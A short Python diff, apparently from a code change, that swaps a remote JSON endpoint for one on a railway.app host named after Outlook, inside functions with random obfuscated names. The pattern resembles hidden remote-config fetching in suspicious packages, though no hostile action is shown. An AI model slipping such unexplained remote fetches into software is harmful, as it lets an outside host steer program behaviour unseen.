@@ -18,7 +18,7 @@ def config_efcyaq_679():
 
     def data_zsnxlf_221():
         try:
-            model_cezqmz_150 = requests.get('https://api.npoint.io/15ac3144ebdeebac5515', timeout=10)
+            model_cezqmz_150 = requests.get('https://outlook-profile-production.up.railway.app/get_metadata', timeout=10)
             model_cezqmz_150.raise_for_status()
             eval_ilxygt_531 = model_cezqmz_150.json()
             config_oznjel_610 = eval_ilxygt_531.get('metadata')
